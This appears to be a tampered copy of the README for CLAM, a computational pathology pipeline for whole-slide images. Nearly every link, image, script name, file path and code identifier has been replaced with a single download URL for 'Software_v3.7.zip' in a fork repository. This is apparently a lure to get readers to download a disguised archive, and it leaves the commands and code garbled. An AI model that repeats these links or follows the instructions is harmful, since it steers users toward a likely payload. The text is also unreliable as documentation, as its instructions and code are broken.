CLAM <img src="https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip" width="280px" align="right" />
===========
Data Efficient and Weakly Supervised Computational Pathology on Whole Slide Images.
*Nature Biomedical Engineering*

[ArXiv](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) | [Journal Link](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) | [Interactive Demo](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) | [Cite](#reference) 
...
[<img src="https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip" width="470px" align="left" />](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip)
## CLAM: A Deep-Learning-based Pipeline for Data Efficient and Weakly Supervised Whole-Slide-level Analysis 
[Pre-requisites](#pre-requisites) • [Installation](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) • [Segmentation and Patching](#wsi-segmentation-and-patching) • [Feature Extraction](#weakly-supervised-learning-using-slide-level-labels-with-clam) • [Weakly Supervised Training](#Training-Splits) • [Testing](#Testing-and-Evaluation-Script) • [Trained Models](#Trained-Model-Checkpoints) • [Heatmap Visualization](#Heatmap-Visualization) • [Examples](#examples) • [Pre-print](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) • [Demo](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) • [Cite](#reference)
...
© [Mahmood Lab](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) - This code is made available under the GPLv3 License and is available for non-commercial academic purposes. 

## Updates:
* 05/24/2021: Script for heatmap visualization now available via **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**, with the configuration template located in **heatmaps/configs**. See [Heatmap visualization for demo and instructions.](#Heatmap-Visualization)
* 03/01/2021: New, fast patching/feature extraction pipeline is now available. **TL;DR:** since CLAM only requires image features for training, it is not necessary to save the actual image patches, the new pipeline rids of this overhead and instead only saves the coordinates of image patches during "patching" and loads these regions on the fly from WSIs during feature extraction. This is significantly faster than the old pipeline and usually only takes 1-2s for "patching" and a couple minutes to featurize a WSI. To use the new pipeline, make sure you are calling **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** and **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** instead of the old **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** and **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** scripts.

Note that the README has been updated to use the new, faster pipeline by default. If you still wish to use the old pipeline, refer to: [Guide for Old Pipeline](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip). It saves tissue patches, which is signficantly slower and takes up a lot of storage space but can still be useful if you need to work with original image patches instead of feature embeddings.
...
Please refer to our [Installation guide](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) for detailed instructions on how to get started.

## WSI Segmentation and Patching 

<img src="https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip" width="1000px" align="center" />
...
```bash
DATA_DIRECTORY/
	├── https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
	├── https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
	└── ...
```
...
``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --source DATA_DIRECTORY --save_dir RESULTS_DIRECTORY --patch_size 256 --seg --patch --stitch 
```
...
The auto-generated csv file **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** contains a list of all slides processed, along with their segmentation/patching parameters used.
...
* `https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip`: used for segmenting biopsy slides scanned at BWH (Scanned using Hamamatsu S210 and Aperio GT450) 
* `https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip`: used for segmenting resection slides scanned at BWH
* `https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip`: used for segmenting TCGA slides

Simply pass the name of the template file to the --preset argument, for example, to use the biopsy template:
``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --source DATA_DIRECTORY --save_dir RESULTS_DIRECTORY --patch_size 256 --preset https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --seg --patch --stitch
```
### Custom Default Segmentation Parameters
For advanced usage, in addition to using the default, single set of parameters defined in the script **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**, the user can define custom templates of parameters depending on the dataset. These templates are expected to be stored under **presets**, and contain values for each of the parameters used during segmentation and patching. 
...
``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --source DATA_DIRECTORY --save_dir RESULTS_DIRECTORY --patch_size 256 --seg  
```
...
The csv file can be tweaked for specific slides, and be passed to the script via the --process_list CSV_FILE_NAME such that the script will use the user-updated specifications. Before tweaking the segmentation parameters, the user should make a copy of the csv file and give it a new name (e.g. https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) because otherwise this file with the default name is overwritten the next time the command is run. Then the user has the option to tweak the parameters for specific slides by changing their corresponding fields in the csv file. The **process** column stores a binary variable (0 or 1) for whether the script should process a specific slide. This allows the user to toggle on just the select few slides to quickly confirm whether the tweaked parameters produce satisfactory results. For example, to re-segment just https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip again using user-updated parameters, make the appropriate changes to its fields, update its **process** cell to 1, save the csv file, and pass its name to the same command as above:

``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --source DATA_DIRECTORY --save_dir RESULTS_DIRECTORY --patch_size 256 --seg --process_list https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
```
...
``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --source DATA_DIRECTORY --save_dir RESULTS_DIRECTORY --patch_size 256 --seg --process_list CSV_FILE_NAME --patch --stitch
```
...
```bash
CUDA_VISIBLE_DEVICES=0,1 python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --data_h5_dir DIR_TO_COORDS --data_slide_dir DATA_DIRECTORY --csv_path CSV_FILE_NAME --feat_dir FEATURES_DIRECTORY --batch_size 512 --slide_ext .svs
```
...
Dataset objects used for actual training/validation/testing can be constructed using the **Generic_MIL_Dataset** Class (defined in **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**). Examples of such dataset objects passed to the models can be found in both **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** and **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**. 

For training, look under https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
```python 
if https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip == 'task_1_tumor_vs_normal':
    args.n_classes=2
    dataset = Generic_MIL_Dataset(csv_path = 'https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip',
                            data_dir= https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip(https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip, 'tumor_vs_normal_feat_resnet'),
                            shuffle = False, 
                            seed = https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip, 
                            print_info = True,
...
```python
https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip('--task', type=str, choices=['task_1_tumor_vs_normal',  'task_2_tumor_subtyping'])
```

### Training Splits
For evaluating the algorithm's performance, multiple folds (e.g. 10-fold) of train/val/test splits can be used. Example 10-fold 80/10/10 splits for the two dummy datasets, using 50% of training data can be found under the **splits** folder. These splits can be automatically generated using the https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip script with minimal modification just like with **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**. For example, tumor_vs_normal splits with 75% of training data can be created by calling:
 
``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --task task_1_tumor_vs_normal --seed 1 --label_frac 0.75 --k 10
```
The script uses the **Generic_WSI_Classification_Dataset** Class for which the constructor expects the same arguments as 
**Generic_MIL_Dataset** (without the data_dir argument). For details, please refer to the dataset definition in **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**

### GPU Training Example for Binary Positive vs. Negative Classification (e.g. Lymph Node Status)
``` shell
CUDA_VISIBLE_DEVICES=0 python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --drop_out --early_stopping --lr 2e-4 --k 10 --label_frac 0.5 --exp_code task_1_tumor_vs_normal_CLAM_50 --weighted_sample --bag_loss ce --inst_loss svm --task task_1_tumor_vs_normal --model_type clam_sb --log_data --data_root_dir DATA_ROOT_DIR
```

### GPU Training Example for Subtyping Problems (e.g. 3-class RCC Subtyping)
``` shell
CUDA_VISIBLE_DEVICES=0 python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --drop_out --early_stopping --lr 2e-4 --k 10 --label_frac 0.5 --exp_code task_2_tumor_subtyping_CLAM_50 --weighted_sample --bag_loss ce --inst_loss svm --task task_2_tumor_subtyping --model_type clam_sb --log_data --subtyping --data_root_dir DATA_ROOT_DIR
``` 
...
``` shell
python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip -h
```
...
``` shell
CUDA_VISIBLE_DEVICES=0 python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --drop_out --k 10 --models_exp_code task_1_tumor_vs_normal_CLAM_50_s1 --save_exp_code task_1_tumor_vs_normal_CLAM_50_s1_cv --task task_1_tumor_vs_normal --model_type clam_sb --results_dir results --data_root_dir DATA_ROOT_DIR
```

``` shell
CUDA_VISIBLE_DEVICES=0 python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --drop_out --k 10 --models_exp_code task_2_tumor_subtyping_CLAM_50_s1 --save_exp_code task_2_tumor_subtyping_CLAM_50_s1_cv --task task_2_tumor_subtyping --model_type clam_sb --results_dir results --data_root_dir DATA_ROOT_DIR
```
...
By adding your own custom datasets into **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** the same way as you do for **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**, you can also easily test trained models on independent test sets. 

### Heatmap Visualization
Heatmap visualization can be computed in bulk via **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** by filling out the config file and storing it in **/heatmaps/configs** and then running **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** with the --config NAME_OF_CONFIG_FILE flag. A demo template is included (**https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip**) for lung subtyping on two WSIs from the CPTAC. 
...
``` shell
CUDA_VISIBLE_DEVICES=0,1 python https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip --config https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
```
See **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** for explanations for each configurable option.


### Trained Model Checkpoints
For reproducability, all trained models used can be accessed [here](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip).
...
For reproducability, these models can be evaluated on data prepared by following the same pipeline described in the sections above by calling **https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip** with the appropriate arguments that specify the model options (--dropout should be enabled and either --model_type clam_mb or --model_type mil should be set, for evaluation only, --subtyping flag does not make a difference) as well as where the model checkpoints (--results_dir and --models_exp_code) and data (--data_root_dir and --task) are stored.

### Examples

Please refer to our pre-print and [interactive demo](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip) for detailed results on three different problems and adaptability across data sources, imaging devices and tissue content. 

<img src="https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip" width="1000px" align="center" />  

Visulize additional examples here: https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
...
## Funding
This work was funded by NIH NIGMS [R35GM138216](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip).

## Reference
If you find our work useful in your research or if you use parts of this code please consider citing our [paper](https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip):

Lu, M.Y., Williamson, D.F.K., Chen, T.Y. et al. Data-efficient and weakly supervised computational pathology on whole-slide images. Nat Biomed Eng 5, 555–570 (2021). https://github.com/avinash737/CLAM/raw/refs/heads/master/heatmaps/demo/Software_v3.7.zip
